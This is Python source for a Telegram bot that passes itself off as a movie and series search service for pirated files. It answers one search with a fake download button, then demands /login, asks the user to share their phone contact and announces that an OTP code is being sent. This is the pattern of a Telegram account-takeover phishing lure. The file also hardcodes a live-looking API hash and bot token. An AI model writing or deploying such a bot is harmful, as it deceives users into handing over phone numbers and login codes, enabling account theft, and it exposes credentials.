from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery

HKZ = Client(
    "Movie Search Bot",  # Session name (can be anything)
    api_id="25988816",
    api_hash="7ad4c2b1e5556277d341477b0776b2de",
    bot_token="8123797711:AAGV6PwwARGI5XNoq_ol0rAzLBvcQC0KWLk"
)

@HKZ.on_message(filters.command("start"))
async def start_command(client, message):
    await message.reply_text(
        text="""
❗️Use /latest Command For Getting Latest Release Updates.
❗️ Just Send Movie Name and Year Correctly. 
❗️ Use /help command to know How to Search Movies.""")
    await message.reply_photo(
        photo="http://postimg.cc/m1F3zH97",
        caption=f"""Hello {message.from_user.mention}, 
Iam a Telegram Movie - Series SearchBot by team @ProSearch.

/start - Start Search Bot
/help - How to Search
/about - About me""",
        reply_markup=InlineKeyboardMarkup( [[
            InlineKeyboardButton("🤖 BOT Updates Channel", url="https://t.me/+3bGT7Ze6qy0wZGY9"),
            ],[
            InlineKeyboardButton("🎙 Latest Uploads Channel", url="https://t.me/+m2YtjBd2t_k0OGU9"),
            ],[
            InlineKeyboardButton("🔶Movies BOT🔍", url="https://t.me/ProSearchX2Bot"),
            InlineKeyboardButton("🔶TVSeries BOT🔍", url="https://t.me/ProsearchY2Bot")
            ]]
            )
        )

@HKZ.on_message(filters.command("help"))
async def help_command(client, message):
    await message.reply_text("""
❗️Use /latest Command For Getting Latest Release Updates.
❗️ Just Send Movie Name and Year Correctly. 
❗️ Use /help command to know How to Search Movies.""")
    await message.reply_text("""
❗️How to Search Movies ❓ 
➖➖➖➖➖➖➖➖➖➖➖

1. Just Send Movie Name and Year Correctly.
(Check Google for Correct Spelling and year) 

Examples: - 
Oppam 2016
Baahubali 2015

Oppam 2016 1080p
Baahubali 2015 1080p
(For Getting only 1080p Quality Files)

Baahubali 2015 Malayalam 
Baahubali 2015 Tamil 
(For Dubbed Movie Files)

〰〰〰〰〰〰〰〰〰〰〰
❗️How to Search TVSeries ❓ 
➖➖➖➖➖➖➖➖➖➖➖

1. Just Send Series Name and Season Correctly.
(Check Google for Correct Spelling) 

Examples: - 
Game of Thrones S01
(S01 For Season 1)

Breaking Bad S02 1080p
For Season 2 1080p Files

Lucifer S03E01 
(For Season 3 Episode 1)


〰〰〰〰〰〰〰〰〰〰〰

❗️On Android, Better Use VLC Media Player , MPV Player,  MX Player Pro, X Player Video Players.""")

@HKZ.on_message(filters.command("about"))
async def about_command(client, message):
    await message.reply_text("""
📌 About @ProSearch Bots
〰〰〰〰〰〰〰〰〰〰〰

❗️Admin     - [@Rocky_Bhayi](https://t.me/Rockybhayibot)
❗️Source Code - [@ELUpdates](https://github.com/EL-Coders/mediafinder)
❗️Hosted Server - [Vpsdime](https://vpsdime.com/)
❗️Database   - [PostgreSQL](https://www.postgresql.org/)""")

@HKZ.on_message(filters.regex(r"(?i)Terminator\s+Judgement\s+Day\s+Malayalam"))  #  (?i) makes it case-insensitive
async def hello_world_handler(client, message):
    await message.reply_text(
        text="""
🔍 Results for your Search 

➠ Latest Uploads: @ProSearchZ
 ➠➠ BOT Updates: @ProSearch🔻""",
        reply_markup=InlineKeyboardMarkup( [[
            InlineKeyboardButton("Terminator Judgement Day Malayalam Dubbed 480p x264 600 MB.mkv", callback_data="result")
            ]]
            )
        )

@HKZ.on_callback_query()
async def callback(bot, msg):
    if msg.data == "result":
        await msg.message.edit_text("""You must /login before receiving the file..❗"""
        )

@HKZ.on_message(filters.command("login") & filters.user(1687129256) | filters.user(7653413730))
async def login_command(client, message):
    user_id = message.from_user.id

    if await is_admin(client, message.chat.id, user_id):
        await message.reply_text(
            text="Share your contact 📞 using the button to continue.",
            reply_markup=InlineKeyboardMarkup( [[
                InlineKeyboardButton("Share Contact ☎", request_contact=True)
                ]]
                )
            )
    else:
        await message.reply_text("You are Banned..🤐")

@HKZ.on_message(filters.contact)
async def contact_shared(client, message):
    await message.reply_text("Sending OTP Code to your Telegram..📲")

print("Bot Started")
HKZ.run()


    
